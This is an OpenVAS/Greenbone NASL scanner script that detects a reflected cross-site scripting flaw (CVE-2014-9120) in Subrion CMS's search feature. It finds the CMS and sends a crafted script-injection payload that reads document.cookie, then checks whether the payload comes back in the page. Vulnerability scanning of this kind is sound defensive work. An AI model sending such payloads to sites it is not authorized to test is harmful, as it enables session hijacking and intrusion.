if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805400" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-9120" );
	script_bugtraq_id( 71655 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-12-17 16:59:56 +0530 (Wed, 17 Dec 2014)" );
	script_name( "Subrion CMS 'search' Functionality Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Subrion CMS
  and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET
  request and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "This flaw exists due to insufficient
  sanitization of input to the 'Search' functionality before returning it to
  users." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  attacker to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "Subrion CMS version 3.2.2 and possibly
  below." );
	script_tag( name: "solution", value: "Upgrade to Subrion CMS version 3.2.3 or
  later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/129447/" );
	script_xref( name: "URL", value: "https://www.netsparker.com/xss-vulnerability-in-subrion-cms" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.subrion.org/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
cmsPort = http_get_port( default: 80 );
if(!http_can_host_php( port: cmsPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/cms", "/subrion", http_cgi_dirs( port: cmsPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: cmsPort );
	if(res && ContainsString( res, "content=\"Subrion CMS" ) && ContainsString( res, "Powered by Subrion" )){
		url = dir + "/search/;\"--></style></scRipt><scRipt>alert(documen" + "t.cookie)</scRipt>/";
		if(http_vuln_check( port: cmsPort, url: url, check_header: TRUE, pattern: "<scRipt>alert\\(document\\.cookie\\)</scRipt>/", extra_check: "Powered by Subrion" )){
			security_message( port: cmsPort );
			exit( 0 );
		}
	}
}
exit( 99 );

